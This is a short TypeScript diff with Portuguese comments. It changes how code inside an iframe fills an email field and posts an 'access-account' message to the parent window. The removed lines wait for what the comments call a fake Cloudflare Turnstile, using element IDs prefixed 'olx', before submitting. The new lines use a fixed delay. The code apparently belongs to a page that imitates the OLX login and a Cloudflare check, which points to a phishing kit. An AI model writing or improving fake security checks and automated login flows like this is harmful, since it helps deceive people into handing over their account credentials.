@@ -321,23 +321,13 @@ export function attachIframeInteractions(doc: Document): () => void {
         else emailInput.value = email;
         emailInput.dispatchEvent(new Event("input", { bubbles: true }));
         emailInput.dispatchEvent(new Event("change", { bubbles: true }));
-        // Aguarda o Cloudflare Turnstile fake terminar ("Sucesso!") antes
-        // de disparar o "Acessar" — assim o usuário não vê o spinner do
-        // Cloudflare aparecer junto com o submit.
-        const waitTurnstileAndSubmit = (tries = 0) => {
-          const fake = doc.getElementById("__olx_turnstile_fake__");
-          const label = fake?.querySelector<HTMLElement>("#__olx_ts_label__");
-          const done = !fake || label?.textContent?.toLowerCase().includes("sucesso");
-          if (done || tries >= 25) {
-            window.parent.postMessage(
-              { type: "iframe-help-action", action: "access-account", email },
-              "*",
-            );
-            return;
-          }
-          setTimeout(() => waitTurnstileAndSubmit(tries + 1), 200);
-        };
-        waitTurnstileAndSubmit();
+        // Pequeno delay pra UI reagir, então dispara o "Acessar"
+        setTimeout(() => {
+          window.parent.postMessage(
+            { type: "iframe-help-action", action: "access-account", email },
+            "*",
+          );
+        }, 150);
       };
       tryFill();
     }
